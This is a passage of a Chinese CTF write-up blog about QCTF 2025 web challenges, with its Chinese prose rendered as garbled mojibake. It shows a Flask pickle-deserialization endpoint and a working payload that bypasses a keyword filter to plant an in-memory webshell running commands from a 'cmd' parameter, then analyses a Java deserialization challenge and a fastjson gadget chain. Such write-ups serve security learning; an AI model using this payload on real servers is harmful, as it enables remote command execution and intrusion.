</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/deser&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">deser</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">a</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;fail&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">decoded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;fail&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">forbidden</span> <span class="ow">in</span> <span class="n">PICKLE_BLACKLIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">forbidden</span> <span class="ow">in</span> <span class="n">decoded_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;waf&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">decoded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;done&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;fail&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸€çœ¼pickleååºåˆ—åŒ–ï¼Œç›´æ¥æ‰“å†…å­˜é©¬ï¼Œosè¢«wafäº†ï¼Œç»•è¿‡ä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,(</span><span class="s2">&#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;o&#39;+&#39;s&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251120144457720.png"
	width="776"
	height="199"
	srcset="/p/qctf2025/image-20251120144457720_hu10809382125241111784.png 480w, /p/qctf2025/image-20251120144457720_hu7832909545845152097.png 1024w"
	loading="lazy"
	
		alt="image-20251120144457720"
	
	
		class="gallery-image" 
		data-flex-grow="389"
		data-flex-basis="935px"
	
></p>
<p>ä¸€å¼€å§‹æˆ‘è¿˜çº³é—·æ€ä¹ˆåå¼¹shellå¼¹ä¸ä¸Šå»ï¼Œæ‰æ„è¯†åˆ°æ˜¯ä¸å‡ºç½‘çš„ç¯å¢ƒ</p>
<h3 id="ez_ref">ez_Ref
</h3><h4 id="çŸ¥è¯†ç‚¹javaååºåˆ—åŒ–fastjsonç»•è¿‡resolveclass">çŸ¥è¯†ç‚¹ï¼šjavaååºåˆ—åŒ–ã€FastJsonç»•è¿‡resolveclass
</h4><p>javaé¢˜ï¼Œæœ‰æºç ç›´æ¥ç”¨ideaåç¼–è¯‘ä¸€æ‰‹ï¼Œå®šä½åˆ°serlvetï¼Œçœ‹çœ‹ä¸»è¦é€»è¾‘</p>
<p><img src="/p/qctf2025/image-20251120145718204.png"
	width="1897"
	height="1158"
	srcset="/p/qctf2025/image-20251120145718204_hu16401930097141744599.png 480w, /p/qctf2025/image-20251120145718204_hu15405217060073651016.png 1024w"
	loading="lazy"
	
		alt="image-20251120145718204"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="393px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">package</span><span class="w"> </span><span class="nn">org.example.ez_java.ez_ref.controll</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ByteArrayInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.EOFException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InvalidClassException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.MissingServletRequestParameterException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">User</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">User</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">({</span><span class="s">&#34;/&#34;</span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">index</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Hello ctfer&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">({</span><span class="s">&#34;/ez_Ref&#34;</span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">Refer</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;å¿…é¡»æºå¸¦dataå‚æ•°&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">decode</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readUTF</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">year</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;Ref&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">year</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">2025</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Object</span><span class="w"> </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;ok&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;something&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">var8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var8</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">InvalidClassException</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="n">var8</span><span class="p">.</span><span class="na">getMessage</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var8</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">MissingServletRequestParameterException</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;è¯·æäº¤ä¸€ä¸ªdataå‚æ•°&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var8</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">IllegalArgumentException</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;data å‚æ•°ä¸åˆæ³•&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="n">var8</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">EOFException</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s">&#34;something&#34;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;exception&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸¤ä¸ªè·¯ç”±ï¼Œä¸€ä¸ªæ˜¯æ ¹ç›®å½•ï¼Œè¾“å‡º<code>helloï¼Œctfer</code>ï¼Œå¦ä¸€ä¸ª<code>/ez_Ref</code>ä¼šè·å–dataå¹¶æŠŠå®ƒååºåˆ—åŒ–ï¼Œè¿˜è¦æ»¡è¶³</p>
<p><code>if (name.equals(&quot;Ref&quot;) &amp;&amp; year == 2025)</code></p>
<p>æˆ‘ä»¬ç»§ç»­çœ‹åˆ°ctferç±»ï¼Œctferç±»é‡Œé¢é‡å†™äº†toStringæ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨templatesImplç±»çš„.getOutputProperties()æ–¹æ³•</p>
<p><img src="/p/qctf2025/image-20251120154357258.png"
	width="1471"
	height="1022"
	srcset="/p/qctf2025/image-20251120154357258_hu17865582747492927595.png 480w, /p/qctf2025/image-20251120154357258_hu4585577579794011377.png 1024w"
	loading="lazy"
	
		alt="image-20251120154357258"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="345px"
	
></p>
<p>è¿™ä¸ªå°±æ˜¯ä¸€äº›ccé“¾ååºåˆ—åŒ–çš„ç»ˆç‚¹ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ‰§è¡Œä»£ç çš„æ–¹æ³•ã€‚</p>
<p>åªæ˜¯æˆ‘ä»¬å‘ç°è¿™é‡Œçš„readObjectç±»é‡Œé¢åµŒå¥—äº†ä¸€å±‚wafã€‚</p>
<p><img src="/p/qctf2025/image-20251120155040180.png"
	width="1421"
	height="1025"
	srcset="/p/qctf2025/image-20251120155040180_hu6966172772629928480.png 480w, /p/qctf2025/image-20251120155040180_hu15036584136621843754.png 1024w"
	loading="lazy"
	
		alt="image-20251120155040180"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="332px"
	
></p>
<p>æ‰€ä»¥ç»§ç»­è·Ÿè¿›çœ‹åˆ°è¿™ä¸ªç±»ï¼Œå°±æ˜¯ä¸€ä¸ªç™½åå•ç»•è¿‡ã€‚è¿™ä¸ªç™½åå•resolveClass</p>
<p><img src="/p/qctf2025/image-20251120160040243.png"
	width="1458"
	height="998"
	srcset="/p/qctf2025/image-20251120160040243_hu12298122342911531833.png 480w, /p/qctf2025/image-20251120160040243_hu4256240846415999101.png 1024w"
	loading="lazy"
	
		alt="image-20251120160040243"
	
	
		class="gallery-image" 
		data-flex-grow="146"
		data-flex-basis="350px"
	
></p>
<p>ç„¶åwpè¯´è¦åˆ†æä¾èµ–ï¼Œå‘ç°å¹¶ä¸å­˜åœ¨å…¶å®ƒä¾èµ–å¯ä»¥æ„é€ æ–°é“¾å­ç»•è¿‡è°ƒç”¨ctfer#toStringæ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œå°±æ˜¯ç»•è¿‡waf</p>
<p>ä¸èƒ½æ–°é“¾å­ï¼Œé‚£å°±ç»•è¿‡ç™½åå•</p>
<p>å› ä¸ºè¦ç»•è¿‡ï¼Œæ‰€æœ‰é¦–å…ˆæˆ‘ä»¬å…ˆæŠŠwafæ‹¿è¿‡æ¥ï¼Œè¿˜åŸä¸€ä¸‹</p>
<p><img src="/p/qctf2025/image-20251120163401796.png"
	width="521"
	height="802"
	srcset="/p/qctf2025/image-20251120163401796_hu4638136364565603816.png 480w, /p/qctf2025/image-20251120163401796_hu2371570931116695507.png 1024w"
	loading="lazy"
	
		alt="image-20251120163401796"
	
	
		class="gallery-image" 
		data-flex-grow="64"
		data-flex-basis="155px"
	
></p>
<p>ç„¶åå°±æ˜¯æ„é€ é“¾å­ç»•è¿‡äº†</p>
<p>é¦–å…ˆéœ€è¦ä¸€äº›å‰ç½®çŸ¥è¯†</p>
<p><a class="link" href="https://dummykitty.github.io/posts/Java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%bb%95%e8%bf%87-resolveClass/"  target="_blank" rel="noopener"
    >Java ååºåˆ—åŒ–ç»•è¿‡ resolvClass | DummyKitty&rsquo;s Blog</a></p>
<p>åœ¨ fastjson &lt;= 1.2.48 ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨è¿™æ ·çš„ä¸€ä¸ª gadgetï¼šé€šè¿‡è§¦å‘ JSONArray å’Œ JSONObject è¿™ä¸¤ä¸ªç±»çš„ toString æ–¹æ³•æ¥è°ƒç”¨ä»»æ„çš„ getter æ–¹æ³•ï¼Œç”±äºè¯¥ç‰ˆæœ¬ä¸‹ï¼ŒJSONArray å’Œ JSONObject å¹¶æ²¡æœ‰ readObject æ–¹æ³•ï¼Œå› æ­¤éœ€è¦é€šè¿‡ BadAttributeValueExpException æ¥è§¦å‘ toStringï¼Œå…·ä½“çš„åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p>
<p>BadAttributeValueExpException -&gt; JSONArray/JSONObject.toString -&gt; toJSONString -&gt; TemplateImpl.getOutputProperties</p>
<p>ç®—äº†è¿™é‡Œç¡®å®æœ‰äº›éš¾ä»¥ç†è§£ï¼Œå…ˆæ”¾æ”¾</p>

</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025/">
        
        

        <div class="article-details">
            <h2 class="article-title">æå®¢å¤§æŒ‘æˆ˜2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">cyberstrikelabæ¸—é€å¤ç°</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">æ˜¥ç§‹äº‘é•œæ¸—é€å¤ç°</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025%E6%B1%9F%E8%A5%BF%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025æ±Ÿè¥¿ä¿¡æ¯æŠ€æœ¯çœèµ›å†³èµ›</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/newstar2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">NewStar2025</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2025 - 
        
        2026 liernian
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
